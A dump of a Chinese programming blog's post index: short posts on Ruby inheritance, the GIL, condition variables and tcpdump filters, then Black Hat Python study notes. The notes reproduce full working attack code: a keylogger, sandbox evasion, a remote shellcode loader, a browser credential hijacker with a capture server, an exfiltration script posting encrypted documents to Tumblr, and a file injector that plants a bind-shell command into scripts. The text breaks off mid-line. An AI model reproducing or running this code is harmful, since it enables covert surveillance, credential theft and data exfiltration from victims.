在ruby的metaclass是這裡的_meta(多出來放東西的地方)\ninheritance 在用parent class的m-env擴張child class的m-env的同時\n因為child class有了到parent class的ref，就可以使用parent class的singleton method\nclass A def self.a p \u0026#34;a\u0026#34; end def b p \u0026#34;b\u0026#34; end end class B \u0026lt; A a p \u0026#34;x\u0026#34; self.a end x = B.new x.b =begin a x a b =end include \u0026amp; extend class與module的差異在一個只能繼承，一個只能include與extend\n被include與extend的method都只看m-env的部分，就是instance method的部分\nextend就是擴充該實體instance的class的meta中的m-env (class method) include就是擴充該實體instance的m-env (instance method)\nmodule InstanceMethods def self.A \u0026#34;in A\u0026#34; end def an_instance_method \u0026#34;You called an_instance_method on #{self.class}\u0026#34; end def self.included(base) p \u0026#34;from include\u0026#34; end end module ClassMethods def self.B \u0026#34;in B\u0026#34; end def a_class_method \u0026#34;You called a_class_method_from_module on #{self}\u0026#34; end def self.extended(base) p \u0026#34;from extend\u0026#34; end end class MyClass include InstanceMethods extend ClassMethods end my_class = MyClass.new puts my_class.an_instance_method # \u0026gt;\u0026gt; You called an_instance_method on MyClass #puts my_class.A #puts my_class.B puts MyClass.a_class_method # \u0026gt;\u0026gt; You called a_class_method on MyClass #puts MyClass.A #puts MyClass.B obj = Object.new obj.extend InstanceMethods puts obj.an_instance_method Ref Extending your include knowledge of Ruby Ruby Sub-Classes/Inheritance, Include, And Extend\n","permalink":"https://littlebees.github.io/2020/10/ruby%E5%A5%87%E5%A6%99%E7%9A%84%E7%B9%BC%E6%89%BF/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e寫寫ruby奇妙的繼承\u003c/p\u003e\n\u003cp\u003e但原本寫好的metaclass的文居然失蹤了!!!\u003c/p\u003e\n\u003cp\u003e我找不到\u0026hellip;.\u003c/p\u003e\n\u003cp\u003e之後會補\u0026hellip;.\u003c/p\u003e","title":"ruby奇妙的繼承"},{"content":"動機 python與ruby上用thread必要面對的課題\nGIL為什麼要存在 省下替各個資料結構上鎖的煩惱 在call C extension時不會出事 如果只有語言自己的原生method調用，基本上可以當成thread-safe來使用 (python有保證，ruby在MRI也有) 缺點 只有一個thread可以在interpreter計算 (就是替{整個}interpreter加鎖，這效能只有單線程能看，多線程就是各thread競爭到死) 不是說有GIL替thread加鎖就不用煩惱race condition的問題 (都有實作timer來搶GIL，如果配上自己的code不是只有語言自己的原生的東西的話就會出事，見下面的code) 使用OS級的thread卻沒有發揮OS級的thread的效能 GIL怎麼被搶，是看各個interpreter的實作，完全不知道什麼時候、情況下發生(有的是時間，有的是bytecode太長) sheep = false 5.times.map do Thread.new do unless sheep sheep = true print(\u0026#34;DONE\u0026#34;) end end end.each(\u0026amp;:join) sheep = Sheep.new 5.times.map do Thread.new do unless sheep.shorn? sheep.shear! end end end.each(\u0026amp;:join) 如何相處 好好地上鎖或是用blocking queue 在IO重的code上用thread，這正是唯一能享受到多線程好處的地方 用fork\u0026hellip;.. 或用 C\u0026hellip;.. Ref Ruby 无人知晓的 GIL 深入 GIL: 如何寫出快速且 thread-safe 的 Python Python的GIL是什么鬼，多线程性能究竟如何 See also: Green_threads\n","permalink":"https://littlebees.github.io/2020/10/global-interpreter-lock/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003epython與ruby上用thread必要面對的課題\u003c/p\u003e","title":"Global Interpreter Lock"},{"content":"動機 現在 main thread 生出 兩條thread 然後 main thread 要等兩條thread完成\n然而有一定機率，兩條子thread的其中一條會整個停住 只有一條可以完成\nhow to cancel the freezed thread? 第一個方法是 在某個子thread完成時就去cancel另一條\n這個方法只要能detach就能實現，但是detach因為不明原因， 被detach的thread會自己消失，跑不到最後，進而無法成功完成\n這裡有detach出事的可能原因\n第二個方法是 讓main thread等，直到一個子thread完成，就通知mainthraed去cancel另一條\n這裡用condition variable就能讓main thread等，所以有以下的code\nvoid child() { doing_something_may_consume_many_time_or_finish_immediately(); clean_up(); pthread_cond_notifiy(\u0026amp;cond) // assume we have a cond var from main thread pthread_mutex_unlock(\u0026amp;lock) // assume we have a mutex from main thread } void main() { pthread_mutex_lock(\u0026amp;lock); pthread_create(child); pthread_create(child); pthread_cond_wait(\u0026amp;cond,\u0026amp;lock); // cancel freezed thread, and clean up } 最初用的時候，不知道為什麼需要mutex 反正不是會被通知嗎? 為什麼需要mutex?\nmain thread waits forever (Lost Wakeup) 之後悲劇就發生了，兩條子thread都沒了，但是main thread卻在cond的wait?!\n考慮到下面的case 在main thread到wait之前，兩條子thread就完成了\n好吧，所以要確保在notify的時候，要有人wait but how??\n所以我們需要mutex，直到碰到wait之前子thread都不能notify\nvoid child() { doing_something_may_consume_many_time_or_finish_immediately(); pthread_mutex_lock(\u0026amp;lock); if (another_thread_is_not_complete()) { clean_up(); pthread_cond_notifiy(\u0026amp;cond) // assume we have a cond var from main thread } pthread_mutex_unlock(\u0026amp;lock) // assume we have a mutex from main thread } void main() { pthread_mutex_lock(\u0026amp;lock); pthread_create(child); pthread_create(child); pthread_cond_wait(\u0026amp;cond,\u0026amp;lock); // cancel freezed thread, and clean up } Spurious Wakeup condition variable其實有的時候會被notify，但是沒有任何thread做notify!?\npthread的說法是完全精確的notify無法在所有平台上，完美的有效率的實作出來 所以會有虛假甦醒(Spurious Wakeup)的問題，但是pthread也不會把這個當成bug\n所以要確保離開wait時，是我們期待的狀態\nvoid child() { doing_something_may_consume_many_time_or_finish_immediately(); pthread_mutex_lock(\u0026amp;lock); if (another_thread_is_not_complete()) { clean_up(); pthread_cond_notifiy(\u0026amp;cond) // assume we have a cond var from main thread } else { // if another is complete, this child need not to do anything // another thread should have done all clean up } pthread_mutex_unlock(\u0026amp;lock) // assume we have a mutex from main thread } void main() { pthread_mutex_lock(\u0026amp;lock); pthread_create(child); pthread_create(child); while (both_child_threads_are_not_complete()) pthread_cond_wait(\u0026amp;cond,\u0026amp;lock); // cancel freezed thread, and clean up } reflection 最初沒加lock在子thread中是因為\n不知道為什麼需要mutex 要加在哪 如果加在child的開頭會擋到另一條child跑 doing_something_may_consume_many_time_or_finish_immediately()\n如果開兩個cond var放在child的開頭，就變成有兩個wait， 如果一條freeze，就不用動了\n到後面才想到，加在clean_up之前\n從有新的thread出生開始，整個程式的執行就變成thread的code混合完成出生之後的code\n而有mutex包起來的話，就可以當成在同一個function中執行，不論是不是在同一個thread\n所以在concurrent programming中，要怎麼決定要不要包mutex?(包的目的有?)\n在thread中的動作有沒有相依於另一個thread 共用同一資源 一般用mutex都是用在多thread共用同一資源，但這個case是為了確保happen-before\nRef 就是這篇救了我\n","permalink":"https://littlebees.github.io/2020/09/%E5%A5%87%E8%81%9E%E8%BB%BC%E4%BA%8B-condition-variable/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e現在 main thread 生出 兩條thread\n然後 main thread 要等兩條thread完成\u003c/p\u003e\n\u003cp\u003e然而有一定機率，兩條子thread的其中一條會整個停住\n只有一條可以完成\u003c/p\u003e","title":"奇聞軼事 - condition variable"},{"content":"動機 很常用，整理一下\n條件式語法(大概整理一下) 與網路有關的部分\n[not] protocol a. ether, fddi, ip, ip6, ppp, radio, rarp, slip, tcp, udp, wlan attr a. [src | dst] [port | portrange | port range | net | host] (要自己接到對應的proto，像ip src port就不對) b. broadcast | multicast (只有ip, ether有用) values (8080, 22-25, 1.2.3.4, 1.2.3.0/24) 組成: 1 2 3 4\n與封包大小有關的部分\n[not] less | greater | \u0026lt;= | \u0026gt;= | \u0026lt; | \u0026gt; | values (123, 456 \u0026hellip;) 組成: 1 2 3\n邏輯\nand(\u0026amp;\u0026amp;) , or(||) , not(!)\n取某個byte\n就是python的list\n{protocol}[nthBytes] {protocol}[a:len] : 從arr[a]取len個\n位元運算 與 比較\n位元運算: \u0026amp;, |, \u0026raquo; , \u0026laquo;\n比較: =, !=\n例子:\n'tcp[13] \u0026amp; 4 = 1' 或 'tcp[13] \u0026amp; 4!=0' 或 'tcp[tcpflags] == tcp-rst' 'tcp[(tcp[12]\u0026gt;\u0026gt;2):4] = 0x5353482D' 好用的命令列參數 -s : Define the snaplength (size) of the capture in bytes. Use -s0 to get everything, unless you are intentionally capturing less. -A : Print each packet (minus its link level header) in ASCII. Handy for capturing web pages. -X : Show the packet’s contents in both hex and ASCII. -D : Show the list of available interfaces -l : Line-readable output (for viewing as you save, or sending to other commands) -q : Be less verbose (more quiet) with your output. -t : Give human-readable timestamp output. -i eth0 : Listen on the eth0 interface. -vv : Verbose output (more v’s gives more output). -c : Only get x number of packets and then stop. -S : Print absolute sequence numbers. -e : Get the ethernet header as well. -q : Show less protocol information. -E : Decrypt IPSEC traffic by providing an encryption key. Ref A tcpdump Tutorial with Examples — 50 Ways to Isolate Traffic tcpdump Cheat Sheet wireshark-filter (注意wireshark的filter能做的比tcpdump多，會多一些語法)\n","permalink":"https://littlebees.github.io/2020/09/tcpdunp%E6%A2%9D%E4%BB%B6%E5%BC%8F%E8%AA%9E%E6%B3%95%E6%95%B4%E7%90%86/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e很常用，整理一下\u003c/p\u003e","title":"tcpdunp條件式語法整理"},{"content":"動機 這是對我來說最hardcore的部分 都沒接觸過啊\nwindows system programming memory forensics code injection (binary \u0026amp; shell code)\n超hardcode\nCH8 主要是讓大家看看ctypes與pyhook的操作\nctypes is a foreign function library for Python. It provides C compatible data types, and allows calling functions in DLLs or shared libraries. It can be used to wrap these libraries in pure Python.\nThe pyHook package provides callbacks for global mouse and keyboard events in Windows. Python applications register event handlers for user input events such as left mouse down, left mouse up, key down, etc. and set the keyboard and/or mouse hook\nkeylogger.py\nfrom ctypes import * import pythoncom import pyHook import win32clipboard user32 = windll.user32 kernel32 = windll.kernel32 psapi = windll.psapi current_window = None def get_current_process(): # get a handle to the foreground window hwnd = user32.GetForegroundWindow() # find the process ID pid = c_ulong(0) user32.GetWindowThreadProcessId(hwnd, byref(pid)) # store the current process ID process_id = \u0026#34;%d\u0026#34; % pid.value # grab the executable executable = create_string_buffer(b\u0026#39;\\x00\u0026#39; * 512) h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid) psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512) # now read it\u0026#39;s title window_title = create_string_buffer(b\u0026#39;\\x00\u0026#39; * 512) length = user32.GetWindowTextA(hwnd, byref(window_title), 512) # print out the header if we\u0026#39;re in the right process print() print(\u0026#34;[ PID: %s - %s - %s ]\u0026#34; % (process_id, executable.value, window_title.value) ) print() # close handles kernel32.CloseHandle(hwnd) kernel32.CloseHandle(h_process) def KeyStroke(event): global current_window # check to see if target changed windows if event.WindowName != current_window: current_window = event.WindowName get_current_process() # if they pressed a standard key if 32 \u0026lt; event.Ascii \u0026lt; 127: print(chr(event.Ascii), end=\u0026#39; \u0026#39;) else: # if [Ctrl-V], get the value on the clipboard # added by Dan Frisch 2014 if event.Key == \u0026#34;V\u0026#34;: win32clipboard.OpenClipboard() pasted_value = win32clipboard.GetClipboardData() win32clipboard.CloseClipboard() print(\u0026#34;[PASTE] - %s\u0026#34; % pasted_value, end=\u0026#39; \u0026#39;) else: print(\u0026#34;[%s]\u0026#34; % event.Key, end=\u0026#39; \u0026#39;) # pass execution to next hook registered return True # create and register a hook manager kl = pyHook.HookManager() kl.KeyDown = KeyStroke # register the hook and execute forever kl.HookKeyboard() pythoncom.PumpMessages() 就是掛callback這沒問題 但要注意的是handler 可以看成windows programming的參考(或是ptr)\nscreenshotter.py\nimport win32gui import win32ui import win32con import win32api # grab a handle to the main desktop window hdesktop = win32gui.GetDesktopWindow() # determine the size of all monitors in pixels width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN) height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN) left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN) top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN) # create a device context desktop_dc = win32gui.GetWindowDC(hdesktop) img_dc = win32ui.CreateDCFromHandle(desktop_dc) # create a memory based device context mem_dc = img_dc.CreateCompatibleDC() # create a bitmap object screenshot = win32ui.CreateBitmap() screenshot.CreateCompatibleBitmap(img_dc, width, height) mem_dc.SelectObject(screenshot) # copy the screen into our memory device context mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY) # save the bitmap to a file screenshot.SaveBitmapFile(mem_dc, \u0026#39;c:\\\\WINDOWS\\\\Temp\\\\screenshot.bmp\u0026#39;) # free our objects mem_dc.DeleteDC() win32gui.DeleteObject(screenshot.GetHandle()) Device Contexts(DC)就是呈現(或放置)圖像的地方 這code有三個DC\ndesktop memory(放圖的地方) bitmap(圖檔) 詳細的Device Contexts要搭配GDI programming來看\n整個流程是 desktop -\u0026gt; memory -\u0026gt; bitmap -\u0026gt; .bmp\nsandbox_detect.py\nimport ctypes import random import time import sys user32 = ctypes.windll.user32 kernel32 = ctypes.windll.kernel32 keystrokes = 0 mouse_clicks = 0 double_clicks = 0 class LASTINPUTINFO(ctypes.Structure): _fields_ = [(\u0026#34;cbSize\u0026#34;, ctypes.c_uint), (\u0026#34;dwTime\u0026#34;, ctypes.c_ulong)] def get_last_input(): struct_lastinputinfo = LASTINPUTINFO() struct_lastinputinfo.cbSize = ctypes.sizeof(LASTINPUTINFO) # get last input registered user32.GetLastInputInfo(ctypes.byref(struct_lastinputinfo)) # now determine how long the machine has been running run_time = kernel32.GetTickCount() elapsed = run_time - struct_lastinputinfo.dwTime print(\u0026#34;[*] It\u0026#39;s been %d milliseconds since the last input event.\u0026#34; % elapsed) return elapsed def get_key_press(): global mouse_clicks global keystrokes for i in range(0, 0xff): if user32.GetAsyncKeyState(i) == -32767: # 0x1 is the code for a left mouse click if i == 1: mouse_clicks += 1 return time.time() else: keystrokes += 1 return None def detect_sandbox(): global mouse_clicks global keystrokes max_keystrokes = random.randint(10, 25) max_mouse_clicks = random.randint(5, 25) double_clicks = 0 max_double_clicks = 10 double_click_threshold = 0.250 first_double_click = None average_mousetime = 0 max_input_threshold = 30000 previous_timestamp = None detection_complete = False last_input = get_last_input() # if we hit our threshold let\u0026#39;s bail out if last_input \u0026gt;= max_input_threshold: sys.exit(0) while not detection_complete: keypress_time = get_key_press() if keypress_time is not None and previous_timestamp is not None: # calculate the time between double clicks elapsed = keypress_time - previous_timestamp # the user double clicked if elapsed \u0026lt;= double_click_threshold: double_clicks += 1 if first_double_click is None: # grab the timestamp of the first double click first_double_click = time.time() else: # did they try to emulate a rapid succession of clicks? if double_clicks == max_double_clicks: if keypress_time - first_double_click \u0026lt;= ( max_double_clicks * double_click_threshold): sys.exit(0) # we are happy there\u0026#39;s enough user input if keystrokes \u0026gt;= max_keystrokes \\ and double_clicks \u0026gt;= max_double_clicks \\ and mouse_clicks \u0026gt;= max_mouse_clicks: return previous_timestamp = keypress_time elif keypress_time is not None: previous_timestamp = keypress_time detect_sandbox() print(\u0026#34;We are ok!\u0026#34;) 用按鍵次數來判斷我們是不是在sanbox中，因為sandbox通常是自動化操作 所以按鍵次數相對固定\n有趣的是這裡處理按鍵是用ctypes硬幹，其實也可以用pyhooks\nshell_exec.py\nimport base64 import ctypes import urllib.request # retrieve the shellcode from our web server url = \u0026#34;http://localhost:8000/shellcode.bin\u0026#34; response = urllib.request.urlopen(url) # decode the shellcode from base64 shellcode = base64.b64decode(response.read()) # create a buffer in memory shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode)) # create a function pointer to our shellcode shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p)) # call our shellcode shellcode_func() 把bytes傳型成CFUNCTYPE來執行 很有趣!!\n不過要怎麼產生.bin? 參考CANVAS或是Metasploits\nCH9 CLE automation?? mitb.py\nimport time import urllib.parse import win32com.client data_receiver = \u0026#34;http://localhost:8080/\u0026#34; target_sites = { \u0026#34;www.facebook.com\u0026#34;: { \u0026#34;logout_url\u0026#34;: None, \u0026#34;logout_form\u0026#34;: \u0026#34;logout_form\u0026#34;, \u0026#34;login_form_index\u0026#34;: 0, \u0026#34;owned\u0026#34;: False }, \u0026#34;accounts.google.com\u0026#34;: { \u0026#34;logout_url\u0026#34;: \u0026#34;https://accounts.google.com/Logout?hl=en\u0026amp;continue=\u0026#34; \u0026#34;https://accounts.google.com/\u0026#34; \u0026#34;ServiceLogin%3Fservice%3Dmail\u0026#34;, \u0026#34;logout_form\u0026#34;: None, \u0026#34;login_form_index\u0026#34;: 0, \u0026#34;owned\u0026#34;: False } } target_sites[\u0026#34;www.gmail.com\u0026#34;] = target_sites[\u0026#34;accounts.google.com\u0026#34;] target_sites[\u0026#34;mail.google.com\u0026#34;] = target_sites[\u0026#34;accounts.google.com\u0026#34;] clsid = \u0026#39;{9BA05972-F6A8-11CF-A442-00A0C90A8F39}\u0026#39; windows = win32com.client.Dispatch(clsid) def wait_for_browser(browser): # wait for the browser to finish loading a page while browser.ReadyState != 4 and browser.ReadyState != \u0026#34;complete\u0026#34;: time.sleep(0.1) return while True: for browser in windows: url = urllib.parse.urlparse(browser.LocationUrl) if url.hostname in target_sites: if target_sites[url.hostname][\u0026#34;owned\u0026#34;]: continue # if there is a URL we can just redirect if target_sites[url.hostname][\u0026#34;logout_url\u0026#34;]: browser.Navigate(target_sites[url.hostname][\u0026#34;logout_url\u0026#34;]) wait_for_browser(browser) else: # retrieve all elements in the document full_doc = browser.Document.all # iterate looking for the logout form for i in full_doc: try: # find the logout form and submit it if i.id == target_sites[url.hostname][\u0026#34;logout_form\u0026#34;]: i.submit() wait_for_browser(browser) except: pass try: # now we modify the login form login_index = target_sites[url.hostname][\u0026#34;login_form_index\u0026#34;] login_page = urllib.parse.quote(browser.LocationUrl) browser.Document.forms[login_index].action = \u0026#34;%s%s\u0026#34; % ( data_receiver, login_page) target_sites[url.hostname][\u0026#34;owned\u0026#34;] = True except: pass time.sleep(5) 這邊的想法是，先把user給logout，再把登入的request傳送到自己的http server來顯示資料，在forward到原本的server\n這邊是攔截ie的資料，那要ie幫忙的方法就是OLE Automation 就是\nclsid = \u0026#39;{9BA05972-F6A8-11CF-A442-00A0C90A8F39}\u0026#39; # 可以當成程式在windows的是識別碼，就是座號啦 # 如何拿clsid? # https://www.c-sharpcorner.com/blogs/how-to-find-clsid-of-a-dll windows = win32com.client.Dispatch(clsid) # 註冊OLE automation 這兩行做的事\nie_exfil.py\nimport win32com.client import os import fnmatch import time import random import zlib import base64 from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_OAEP doc_type = \u0026#34;.doc\u0026#34; username = \u0026#34;test@test.com\u0026#34; password = \u0026#34;testpassword\u0026#34; public_key = \u0026#34;\u0026#34;\u0026#34;-----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyXUTgFoL/2EPKoN31l5T lak7VxhdusNCWQKDfcN5Jj45GQ1oZZjsECQ8jK5AaQuCWdmEQkgCEV23L2y71G+T h/zlVPjp0hgC6nOKOuwmlQ1jGvfVvaNZ0YXrs+sX/wg5FT/bTS4yzXeW6920tdls 2N7Pu5N1FLRW5PMhk6GW5rzVhwdDvnfaUoSVj7oKaIMLbN/TENvnwhZZKlTZeK79 ix4qXwYLe66CrgCHDf4oBJ/nO1oYwelxuIXVPhIZnVpkbz3IL6BfEZ3ZDKzGeRs6 YLZuR2u5KUbr9uabEzgtrLyOeoK8UscKmzOvtwxZDcgNijqMJKuqpNZczPHmf9cS 1wIDAQAB -----END PUBLIC KEY-----\u0026#34;\u0026#34;\u0026#34; def wait_for_browser(browser): # wait for the browser to finish loading a page while browser.ReadyState != 4 and browser.ReadyState != \u0026#34;complete\u0026#34;: time.sleep(0.1) return def encrypt_string(plaintext): chunk_size = 208 if isinstance(plaintext, (str)): plaintext = plaintext.encode() print(\u0026#34;Compressing: %d bytes\u0026#34; % len(plaintext)) plaintext = zlib.compress(plaintext) print(\u0026#34;Encrypting %d bytes\u0026#34; % len(plaintext)) rsakey = RSA.importKey(public_key) rsakey = PKCS1_OAEP.new(rsakey) encrypted = b\u0026#34;\u0026#34; offset = 0 while offset \u0026lt; len(plaintext): chunk = plaintext[offset:offset + chunk_size] if len(chunk) % chunk_size != 0: chunk += b\u0026#34; \u0026#34; * (chunk_size - len(chunk)) encrypted += rsakey.encrypt(chunk) offset += chunk_size encrypted = base64.b64encode(encrypted) print(\u0026#34;Base64 encoded crypto: %d\u0026#34; % len(encrypted)) return encrypted def encrypt_post(filename): # open and read the file fd = open(filename, \u0026#34;rb\u0026#34;) contents = fd.read() fd.close() encrypted_title = encrypt_string(filename) encrypted_body = encrypt_string(contents) return encrypted_title, encrypted_body def random_sleep(): time.sleep(random.randint(5, 10)) return def login_to_tumblr(ie): # retrieve all elements in the document full_doc = ie.Document.all # iterate looking for the logout form for i in full_doc: if i.id == \u0026#34;signup_email\u0026#34;: i.setAttribute(\u0026#34;value\u0026#34;, username) elif i.id == \u0026#34;signup_password\u0026#34;: i.setAttribute(\u0026#34;value\u0026#34;, password) random_sleep() # you can be presented with different homepages try: if ie.Document.forms[0].id == \u0026#34;signup_form\u0026#34;: ie.Document.forms[0].submit() else: ie.Document.forms[1].submit() except IndexError: pass random_sleep() # the login form is the second form on the page wait_for_browser(ie) return def post_to_tumblr(ie, title, post): full_doc = ie.Document.all for i in full_doc: if i.id == \u0026#34;post_one\u0026#34;: i.setAttribute(\u0026#34;value\u0026#34;, title) title_box = i i.focus() elif i.id == \u0026#34;post_two\u0026#34;: i.setAttribute(\u0026#34;innerHTML\u0026#34;, post) print(\u0026#34;Set text area\u0026#34;) i.focus() elif i.id == \u0026#34;create_post\u0026#34;: print(\u0026#34;Found post button\u0026#34;) post_form = i i.focus() # move focus away from the main content box random_sleep() title_box.focus() random_sleep() # post the form post_form.children[0].click() wait_for_browser(ie) random_sleep() return def exfiltrate(document_path): ie = win32com.client.Dispatch(\u0026#34;InternetExplorer.Application\u0026#34;) ie.Visible = 1 # head to tumblr and login ie.Navigate(\u0026#34;http://www.tumblr.com/login\u0026#34;) wait_for_browser(ie) print(\u0026#34;Logging in...\u0026#34;) login_to_tumblr(ie) print(\u0026#34;Logged in...navigating\u0026#34;) ie.Navigate(\u0026#34;https://www.tumblr.com/new/text\u0026#34;) wait_for_browser(ie) # encrypt the file title, body = encrypt_post(document_path) print(\u0026#34;Creating new post...\u0026#34;) post_to_tumblr(ie, title, body) print(\u0026#34;Posted!\u0026#34;) # Destroy the IE instance ie.Quit() ie = None return # main loop for document discovery for parent, directories, filenames in os.walk(\u0026#34;C:\\\\\u0026#34;): for filename in fnmatch.filter(filenames, \u0026#34;*%s\u0026#34; % doc_type): document_path = os.path.join(parent, filename) print(\u0026#34;Found: %s\u0026#34; % document_path) exfiltrate(document_path) input(\u0026#34;Continue?\u0026#34;) 加密filepath，po到tumblr去\nkeygen.py \u0026amp; decryptor.py\nimport zlib import base64 from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_OAEP new_key = RSA.generate(2048) public_key = new_key.publickey().exportKey(\u0026#34;PEM\u0026#34;) private_key = new_key.exportKey(\u0026#34;PEM\u0026#34;) encrypted = \u0026#34;\u0026#34;\u0026#34;XxfaX7nfQ48K...................G2V+2zuq6ol8Cs=\u0026#34;\u0026#34;\u0026#34; private_key = \u0026#34;\u0026#34;\u0026#34;-----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEAyXUTgFoL/2EPKoN31l5Tlak7VxhdusNCWQKDfcN5Jj45GQ1o ................................... vOGHt9D9yo3DOhyvJbedpi3u3g13G+FZFw6d1T8Jzm5eZUvG7WeUtg== -----END RSA PRIVATE KEY-----\u0026#34;\u0026#34;\u0026#34; rsakey = RSA.importKey(private_key) rsakey = PKCS1_OAEP.new(rsakey) offset = 0 decrypted = \u0026#34;\u0026#34; encrypted = base64.b64decode(encrypted) while offset \u0026lt; len(encrypted): decrypted += rsakey.decrypt(encrypted[offset:offset + 256]) offset += 256 # now we decompress to original plaintext = zlib.decompress(decrypted) print(plaintext) 就是加解密，原本是兩個檔案，但因為這很好理解他們想幹嘛，同時又都不長，就合併在一起了\ncred_server.py\nimport http.server import socketserver import urllib.error import urllib.parse import urllib.request class CredRequestHandler(http.server.SimpleHTTPRequestHandler): def do_POST(self): content_length = int(self.headers[\u0026#39;Content-Length\u0026#39;]) creds = self.rfile.read(content_length).decode(\u0026#39;utf-8\u0026#39;) print(creds) site = self.path[1:] self.send_response(301) self.send_header(\u0026#39;Location\u0026#39;, urllib.parse.unquote(site)) self.end_headers() server = socketserver.TCPServer((\u0026#39;0.0.0.0\u0026#39;, 8080), CredRequestHandler) server.serve_forever() 就是會顯示request的http server\nCH10 這裡的目的是找出\n高權限process會使用的檔案，但其檔案可以被低權限的使用者取用的檔案\n以此繞過權限管制\n下面的兩個code就是分別\n找出高權限(有趣的)process 當檔案被修改時插入我們的code process_monitor.py\nimport win32con import win32api import win32security import wmi import os LOG_FILE = \u0026#34;process_monitor_log.csv\u0026#34; def get_process_privileges(pid): try: # obtain a handle to the target process hproc = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION, False, pid) # open the main process token htok = win32security.OpenProcessToken(hproc, win32con.TOKEN_QUERY) # retrieve the list of privileges enabled privs = win32security.GetTokenInformation( htok, win32security.TokenPrivileges) # iterate over privileges and output the ones that are enabled priv_list = [] for priv_id, priv_flags in privs: # check if the privilege is enabled if priv_flags == 3: priv_list.append( win32security.LookupPrivilegeName(None, priv_id)) except: priv_list.append(\u0026#34;N/A\u0026#34;) return \u0026#34;|\u0026#34;.join(priv_list) def log_to_file(message): fd = open(LOG_FILE, \u0026#34;ab\u0026#34;) fd.write(\u0026#34;%s\\r\\n\u0026#34; % message) fd.close() return # create a log file header if not os.path.isfile(LOG_FILE): log_to_file(\u0026#34;Time,User,Executable,CommandLine,PID,ParentPID,Privileges\u0026#34;) # instantiate the WMI interface c = wmi.WMI() # create our process monitor process_watcher = c.Win32_Process.watch_for(\u0026#34;creation\u0026#34;) while True: try: new_process = process_watcher() proc_owner = new_process.GetOwner() proc_owner = \u0026#34;%s\\\\%s\u0026#34; % (proc_owner[0], proc_owner[2]) create_date = new_process.CreationDate executable = new_process.ExecutablePath cmdline = new_process.CommandLine pid = new_process.ProcessId parent_pid = new_process.ParentProcessId privileges = get_process_privileges(pid) process_log_message = \u0026#34;%s,%s,%s,%s,%s,%s,%s\u0026#34; % ( create_date, proc_owner, executable, cmdline, pid, parent_pid, privileges) print(\u0026#34;%s\\r\\n\u0026#34; % process_log_message) log_to_file(process_log_message) except: pass 把所有新產生的process的權限列出來 這邊使用的是windows WMI API\n這邊有一些有趣的權限，但就不列出詳細的作用(懶)\nSeBackupPrivilege SeDebugPrivilege SeLoadDriver file_monitor.py\n# Modified example that is originally given here: # http://timgolden.me.uk/python/win32_how_do_i/watch_directory_for_changes.html import tempfile import threading import win32file import win32con import os # these are the common temp file directories dirs_to_monitor = [\u0026#34;C:\\\\WINDOWS\\\\Temp\u0026#34;, tempfile.gettempdir()] # file modification constants FILE_CREATED = 1 FILE_DELETED = 2 FILE_MODIFIED = 3 FILE_RENAMED_FROM = 4 FILE_RENAMED_TO = 5 # extension based code snippets to inject file_types = {} command = \u0026#34;C:\\\\WINDOWS\\\\TEMP\\\\bhpnet.exe –l –p 9999 –c\u0026#34; file_types[\u0026#39;.vbs\u0026#39;] = [\u0026#34;\\r\\n\u0026#39;bhpmarker\\r\\n\u0026#34;, \u0026#34;\\r\\nCreateObject(\\\u0026#34;Wscript.Shell\\\u0026#34;).Run(\\\u0026#34;%s\\\u0026#34;)\\r\\n\u0026#34; % command] file_types[\u0026#39;.bat\u0026#39;] = [\u0026#34;\\r\\nREM bhpmarker\\r\\n\u0026#34;, \u0026#34;\\r\\n%s\\r\\n\u0026#34; % command] file_types[\u0026#39;.ps1\u0026#39;] = [\u0026#34;\\r\\n#bhpmarker\u0026#34;, \u0026#34;Start-Process \\\u0026#34;%s\\\u0026#34;\u0026#34; % command] def inject_code(full_filename, extension, contents): # is our marker already in the file? if file_types[extension][0] in contents: return # no marker let\u0026#39;s inject the marker and code full_contents = file_types[extension][0] full_contents += file_types[extension][1] full_contents += contents fd = open(full_filename, \u0026#34;wb\u0026#34;) fd.write(full_contents.encode()) fd.close() print(\u0026#34;[\\o/] Injected code.\u0026#34;) return def start_monitor(path_to_watch): # we create a thread for each monitoring run file_list_directory = 0x0001 h_directory = win32file.CreateFile( path_to_watch, file_list_directory, win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE, None, win32con.OPEN_EXISTING, win32con.FILE_FLAG_BACKUP_SEMANTICS, None) while 1: try: results = win32file.ReadDirectoryChangesW( h_directory, 1024, True, win32con.FILE_NOTIFY_CHANGE_FILE_NAME | win32con.FILE_NOTIFY_CHANGE_DIR_NAME | win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES | win32con.FILE_NOTIFY_CHANGE_SIZE | win32con.FILE_NOTIFY_CHANGE_LAST_WRITE | win32con.FILE_NOTIFY_CHANGE_SECURITY, None, None ) for action, file_name in results: full_filename = os.path.join(path_to_watch, file_name) if action == FILE_CREATED: print(\u0026#34;[ + ] Created %s\u0026#34; % full_filename) elif action == FILE_DELETED: print(\u0026#34;[ - ] Deleted %s\u0026#34; % full_filename) elif action == FILE_MODIFIED: print(\u0026#34;[ * ] Modified %s\u0026#34; % full_filename) # dump out the file contents print(\u0026#34;[vvv] Dumping contents...\u0026#34;) try: fd = open(full_filename, \u0026#34;rb\u0026#34;) contents = fd.read() fd.close() print(contents) print(\u0026#34;[^^^] Dump complete.\u0026#34;) filename, extension = os.path.splitext(full_filename) if extension in 